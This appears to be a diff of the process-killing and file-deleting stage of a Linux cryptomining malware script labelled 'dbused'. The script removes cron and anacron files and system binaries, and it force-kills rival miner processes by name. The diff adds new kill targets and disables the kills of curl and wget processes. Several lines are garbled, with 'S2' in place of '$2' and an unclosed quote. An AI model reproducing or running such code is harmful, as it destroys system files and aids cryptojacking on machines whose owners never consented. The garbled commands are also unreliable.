@@ -1,13 +1,9 @@
 # dbused
 rm -f /etc/cron.hourly/oanacroner
 rm -f /etc/cron.hourly/oanacrona
-rm -f /etc/cron.hourly/0anacron
 rm -f /etc/cron.daily/oanacroner
 rm -f /etc/cron.daily/oanacrona
-rm -f /etc/cron.daily/0anacron
 rm -f /etc/cron.monthly/oanacroner
-rm -f /etc/cron.monthly/oanacrona
-rm -f /etc/cron.monthly/0anacron
 rm -f /usr/sbin/anacron
 rm -f /var/spool/anacron/cron.daily
 rm -f/usr/bin/on_ac_power
@@ -50,6 +46,10 @@ ps aux | grep -v grep | grep 'apacheorg.xyz' | awk '{print S2}' | xargs -I % kil
 ps aux | grep -v grep | grep 'bashirc' | awk '{print S2}' | xargs -I % kill -9 %
 ps aux | grep -v grep | grep 'dbuse' | awk '{print S2}' | xargs -I % kill -9 %
 ps aux | grep -v grep | grep 'dbused' | awk '{print S2}' | xargs -I % kill -9 %
+ps aux | grep -v grep | grep 'kthreaddk | awk '{print S2}' | xargs -I % kill -9 % 
+ps aux | grep -v grep | grep 'gitlab-exp' | awk '{print S2}' | xargs -I % kill -9 %
+ps aux | grep -v grep | grep '614fc2' | awk '{print S2}' | xargs -I % kill -9 %
+ps aux | grep -v grep | grep '8uv9nplnuno' | awk '{print S2}' | xargs -I % kill -9 %
 ps aux | grep -v grep | grep 'givemexyz' | awk '{print S2}' | xargs -I % kill -9 %
 ps aux | grep -v grep | grep 'javaupDates' | awk '{print S2}' | xargs -I % kill -9 %
 ps aux | grep -v grep | grep 'kdevtmpfsi' | awk '{print S2}' | xargs -I % kill -9 %
@@ -59,6 +59,6 @@ ps aux | grep -v grep | grep 'shm/pty86' | awk '{print S2}'	| xargs -I % kill -9
 ps aux | grep -v grep | grep 'trace' | awk '{print S2}'	| xargs -I % kill -9 %
 ps aux | grep -v grep | grep 'urllib.urlopen' | awk '{print S2}' | xargs -I % kill -9 %
 ps aux | grep -v grep | grep 'Y3VybC3odHRw' | awk '{print $2}' | xargs -I % kill -9 %
-ps aux | grep -v grep | grep -v rtemp | grep -v stg | grep 'curl' | awk '{print S2}' | xargs -I % kill -9 %
-ps aux | grep -v grep | grep -v rtemp | grep -v stg | grep 'urlopen' | awk '{print $2}'	| xargs -I % kill -9 %
-ps aux | grep -v grep | grep -v rtemp | grep -v stg | grep 'wget'	| awk '{print S2}'	| xargs -I % kill -9 %
+# ps aux | grep -v grep | grep -v rtemp | grep -v stg | grep 'curl' | awk '{print S2}' | xargs -I % kill -9 %
+# ps aux | grep -v grep | grep -v rtemp | grep -v stg | grep 'urlopen' | awk '{print $2}'	| xargs -I % kill -9 %
+# ps aux | grep -v grep | grep -v rtemp | grep -v stg | grep 'wget'	| awk '{print S2}'	| xargs -I % kill -9 %
